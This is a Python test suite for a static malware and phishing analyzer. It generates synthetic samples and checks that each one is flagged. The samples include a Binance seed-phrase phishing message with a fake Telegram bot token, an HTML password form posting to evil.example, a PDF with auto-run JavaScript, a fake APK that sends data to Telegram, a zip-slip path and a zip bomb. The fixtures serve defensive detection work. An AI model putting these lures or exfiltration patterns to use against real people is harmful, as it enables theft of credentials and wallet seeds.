# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-only
# Copyright (C) 2026 Robi (@robi44610)
"""Testy statycznej analizy (RE) na NIESZKODLIWYCH, syntetycznych probkach generowanych w locie.
Uruchom:  python3 -m unittest tests/test_re.py"""
import io
import os
import plistlib
import re
import struct
import sys
import unittest
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import re_static as R  # noqa: E402

TG = b"1234567890:AA" + b"b" * 33   # format tokenu bota (falszywy)


def codes(r):
    return {i["code"] for i in r["indicators"]}


def axml(package, perms):
    """Minimalny binarny AndroidManifest.xml (format AXML) - do testow parsera."""
    strings = ["manifest", "package", package, "uses-permission", "name"] + perms
    data = b""
    offs = []
    for s in strings:
        offs.append(len(data))
        e = s.encode("utf-16le")
        data += struct.pack("<H", len(s)) + e + b"\x00\x00"
    while len(data) % 4:
        data += b"\x00"
    hdr = 28 + 4 * len(strings)
    pool = struct.pack("<HHIIIIII", 0x0001, 28, hdr + len(data), len(strings), 0, 0, hdr, 0)
    pool += b"".join(struct.pack("<I", o) for o in offs) + data

    def elem(name_i, attrs):
        body = struct.pack("<iI", -1, name_i) + struct.pack("<HHHHHH", 20, 20, len(attrs), 0, 0, 0)
        for an, av in attrs:
            body += struct.pack("<iIiHBBI", -1, an, av, 8, 0, 3, av)
        return struct.pack("<HHI", 0x0102, 16, 16 + len(body)) + struct.pack("<II", 1, 0xFFFFFFFF) + body
    chunks = elem(0, [(1, 2)])
    for i, _p in enumerate(perms):
        chunks += elem(3, [(4, 5 + i)])
    xml = pool + chunks
    return struct.pack("<HHI", 0x0003, 8, 8 + len(xml)) + xml


def mkzip(entries):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in entries:
            z.writestr(n, d)
    return b.getvalue()


class RETests(unittest.TestCase):
    def test_hashes_and_vt_link(self):
        r = R.analyze(b"hello world", "a.txt")
        self.assertEqual(r["sha256"], "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9")
        self.assertEqual(r["md5"], "5eb63bbbe01eeed093cb22bb8f5acdc3")
        self.assertEqual(r["virustotal"], "https://www.virustotal.com/gui/file/" + r["sha256"])
        self.assertEqual(r["type"], "text")

    def test_phishing_text(self):
        t = (b"Binance security team: enter your 12 words seed phrase and Google Authenticator code at "
             b"https://binance-secure.top/verify . Payout 0x" + b"ab" * 20 + b" bot " + TG + b" api.telegram.org/bot")
        r = R.analyze(t, "msg.txt")
        for c in ("seed_harvest", "code_harvest", "telegram_exfil", "wallet_addresses", "brand_mention"):
            self.assertIn(c, codes(r))
        self.assertIn("https://binance-secure.top/verify", r["iocs"]["urls"])
        self.assertTrue(r["iocs"]["telegram"][0].endswith("…"))          # token zamaskowany
        self.assertNotIn(TG.decode(), str(r))
        self.assertGreaterEqual(r["score"], 60)

    def test_html_form(self):
        h = b"<!DOCTYPE html><html><body><form action='https://evil.example/collect'><input type=password name=p></form><script>eval(atob('YQ=='))</script></body></html>"
        r = R.analyze(h, "x.html")
        self.assertEqual(r["type"], "html")
        self.assertTrue({"html_external_form", "html_password_form", "obfuscation"} <= codes(r))

    def test_html_fragment_without_doctype(self):
        # fragment strony (bez <!DOCTYPE>/<html>) też musi być rozpoznany jako HTML
        r = R.analyze(b'<form action="https://evil.example/x"><input type="password" name="p"></form>', "x.bin")
        self.assertEqual(r["type"], "html")
        self.assertTrue({"html_external_form", "html_password_form"} <= codes(r))
        self.assertEqual(R.analyze(b"<p>hello</p>", "page.htm")["type"], "html")
        self.assertEqual(R.analyze(b"a < b and c > d", "notes.txt")["type"], "text")

    def test_pdf(self):
        r = R.analyze(b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JavaScript (app.alert(1)) >>\n%%EOF", "a.pdf")
        self.assertEqual(r["type"], "pdf")
        self.assertIn("pdf_active", codes(r))

    def test_native(self):
        self.assertEqual(R.analyze(b"MZ" + b"\x00" * 100 + b"UPX!" + b"\x00" * 100)["type"], "pe")
        self.assertIn("packed_upx", codes(R.analyze(b"MZ" + b"\x00" * 100 + b"UPX!")))
        self.assertEqual(R.analyze(b"\xcf\xfa\xed\xfe" + b"\x00" * 64)["type"], "macho")
        self.assertEqual(R.analyze(b"\x7fELF" + b"\x00" * 64)["type"], "elf")

    def test_apk(self):
        man = axml("com.binance.wallet.update", ["android.permission.READ_SMS", "android.permission.SYSTEM_ALERT_WINDOW", "android.permission.INTERNET"])
        dex = b"dex\n035\x00" + b"\x00" * 32 + b"https://api.telegram.org/bot" + TG + b"\x00mnemonic\x00"
        r = R.analyze(mkzip([("AndroidManifest.xml", man), ("classes.dex", dex), ("res/x.txt", b"hi")]), "app.apk")
        self.assertEqual(r["type"], "apk")
        self.assertEqual(r["apk"]["package"], "com.binance.wallet.update")
        self.assertIn("android.permission.READ_SMS", r["apk"]["permissions"])
        self.assertEqual(set(r["apk"]["dangerous"]), {"sms", "overlay"})
        self.assertTrue({"apk_dangerous_perms", "apk_brand_package", "apk_sideload", "telegram_exfil", "seed_harvest"} <= codes(r))

    def test_ipa(self):
        pl = plistlib.dumps({"CFBundleIdentifier": "com.fake.binancepro", "CFBundleName": "Binance Pro"}, fmt=plistlib.FMT_BINARY)
        r = R.analyze(mkzip([("Payload/Fake.app/Info.plist", pl), ("Payload/Fake.app/Fake", b"\xcf\xfa\xed\xfe")]))
        self.assertEqual(r["type"], "ipa")
        self.assertEqual(r["ipa"]["bundle_id"], "com.fake.binancepro")
        self.assertIn("ipa_brand_bundle", codes(r))

    def test_zip_slip_and_exe(self):
        r = R.analyze(mkzip([("../../etc/evil.sh", b"echo"), ("setup.exe", b"MZ")]))
        self.assertTrue({"zip_slip", "zip_executable"} <= codes(r))

    def test_zip_bomb_not_read(self):
        data = mkzip([("big.txt", b"\x00" * (6 * 1024 * 1024))])
        self.assertLess(len(data), 64 * 1024)
        r = R.analyze(data)
        self.assertIn("zip_bomb", codes(r))

    def test_zip_corrupt(self):
        self.assertIn("zip_corrupt", codes(R.analyze(b"PK\x03\x04garbage")))

    def test_timeout(self):
        r = R.analyze(b"x" * 100000 + b" https://a.example ", seconds=0)
        self.assertIn("timeout_partial", codes(r))

    def test_axml_parser(self):
        pkg, perms, _v = R.parse_axml(axml("org.example", ["android.permission.CAMERA"]))
        self.assertEqual((pkg, perms), ("org.example", ["android.permission.CAMERA"]))
        with self.assertRaises(ValueError):
            R.parse_axml(b"<xml/>")

    def test_all_codes_translated(self):
        with open(os.path.join(os.path.dirname(R.__file__), "re_static.py"), encoding="utf-8") as f:
            src = f.read()
        used = set(re.findall(r'(?<![.\w])add\("(\w+)"', src))
        with open(os.path.join(os.path.dirname(R.__file__), "static", "bg-i18n.js"), encoding="utf-8") as f:
            i18n = f.read()
        for c in used:
            self.assertEqual(i18n.count("ri_%s:" % c), 3, c)   # EN + PL + ZH
        for g in set(R.DANGEROUS_PERMS.values()):
            self.assertEqual(i18n.count("pg_%s:" % g), 3, g)
        for k in re.findall(r'return "(\w+)"', src):
            self.assertEqual(i18n.count("t_%s:" % k), 3, k)


if __name__ == "__main__":
    unittest.main()
